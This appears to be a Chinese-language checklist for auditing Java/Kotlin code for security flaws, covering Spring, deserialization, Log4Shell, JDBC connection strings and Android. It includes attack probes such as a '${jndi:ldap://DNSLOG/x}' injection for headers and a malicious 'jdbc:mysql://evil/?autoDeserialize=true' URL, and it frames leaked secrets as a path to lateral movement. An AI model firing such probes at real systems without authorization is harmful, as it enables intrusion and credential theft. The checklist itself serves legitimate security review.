# Java / Kotlin 审计要点

基础 Sink 表见 `code-audit` W2；本篇补框架与语言特有面。

## Spring

- **SpEL 注入**：`@Value("#{...}")` 拼用户输入、`SpelExpressionParser.parseExpression(userInput)`。
- **Actuator 暴露**：`/actuator/env`（密钥）、`/heapdump`（**内存里的会话与口令**）、`/mappings`（全路由）、`/jolokia`（可打 RCE）、`/configprops`。
- **`@PathVariable` 截断**：`/user/{id}` 遇 `.` 截断、`;` 参数；`**` 通配的 `antMatcher` 与实际路径解析差异 → 鉴权绕过。
- **Mass Assignment**：`@RequestBody` 直绑实体（缺 `@JsonIgnore` / 缺 DTO）。
- **Spring Security 配置**：`permitAll` 范围、`antMatchers` 顺序（先宽后严 = 全放行）、CSRF 关闭、`@PreAuthorize` 未开 `@EnableGlobalMethodSecurity`（注解写了但不生效）。
- **历史高危**：Spring4Shell（`class.module.classLoader`）、Spring Cloud Function SpEL、Spring Cloud Gateway Actuator。

## 序列化库

`fastjson` autoType（各版本绕过众多）、Jackson `enableDefaultTyping` / `@JsonTypeInfo`、XStream、Hessian、Kryo、`readObject`、`XMLDecoder`。

Gadget 面取决于 classpath：commons-collections / commons-beanutils / groovy / rome / c3p0 等在不在。

## JNDI / Log4Shell 类

`${jndi:ldap://}` —— 凡是**用户可控内容进日志**（UA、Referer、用户名、参数、异常消息）且 log4j2 < 2.17 都要测。同类：Logback JNDI、`InitialContext.lookup(userInput)`、JNDI 数据源可配置。

黑盒探针：把 `${jndi:ldap://DNSLOG/x}` 塞进 User-Agent / 各参数，看带外。

## 连接串攻击

`jdbc:mysql://evil/?autoDeserialize=true&queryInterceptors=...` → 客户端反序列化 RCE；H2 `INIT=RUNSCRIPT` → RCE。**凡是"用户可填数据库连接串"的功能（数据源管理、数据同步、报表配置）都是 RCE 候选。**

## Kotlin

`!!` 空断言 → DoS；data class 直绑 → Mass Assignment；协程共享可变状态竞态。Kotlin 不改变上述 Java 层风险。

## Android（若含移动端）

- `exported=true` 的四大组件
- `WebView` 的 `addJavascriptInterface` / `setAllowFileAccess` / `setAllowUniversalAccessFromFileURLs`
- 深链 `scheme://` 劫持
- 硬编码密钥（`strings.xml` / `BuildConfig` / 反编译 smali）
- `SharedPreferences` 明文存 token
- 证书校验被 `TrustAllCerts` 关掉
- `android:debuggable` / `android:allowBackup`

取源：`apktool d app.apk` + `jadx-gui`。

## 密钥泄露即接管

Spring 各类 secret、`/actuator/heapdump` 里的会话与口令、`application-*.yml` 里的数据源明文口令——拿到即横向。
